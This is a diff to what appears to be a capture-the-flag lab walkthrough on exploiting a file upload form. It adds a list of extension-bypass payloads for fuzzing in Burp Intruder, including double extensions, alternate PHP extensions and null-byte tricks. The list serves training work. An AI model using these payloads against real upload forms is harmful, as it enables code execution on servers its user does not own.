@@ -16,7 +16,34 @@ Try to exploit the upload form to read the flag found at the root directory "/".
 
 2. Send a legitimate file/image to see the positive response ![alt text]({E83EDB7D-D49B-4694-8EC7-AA7CA2E016F9}.png)
 
-3. Transfer the requests to Intruder and FUZZ the extension, analyze the extensions that are allowed (disable URL encoding before running the Intruder) ![alt text](<{41D7C4E9-F7CA-4D7E-B843-713F7A59347E} 1.png>)
+3. Transfer the requests to Intruder and FUZZ the extension below, analyze the extensions that are allowed (disable URL encoding before running the Intruder)
+```
+.svg
+.jpeg.php
+.jpg.php
+.png.php
+.php
+.php3
+.php4
+.php5
+.php7
+.php8
+.pht
+.phar
+.phpt
+.pgif
+.phtml
+.phtm
+.php%00.gif
+.php\x00.gif
+.php%00.png
+.php\x00.png
+.php%00.jpg
+.php\x00.jpg
+.inc
+```
+
+ ![alt text](<{41D7C4E9-F7CA-4D7E-B843-713F7A59347E} 1.png>)
 
 4. Document the allowed extensions (use one of these as filename)
 
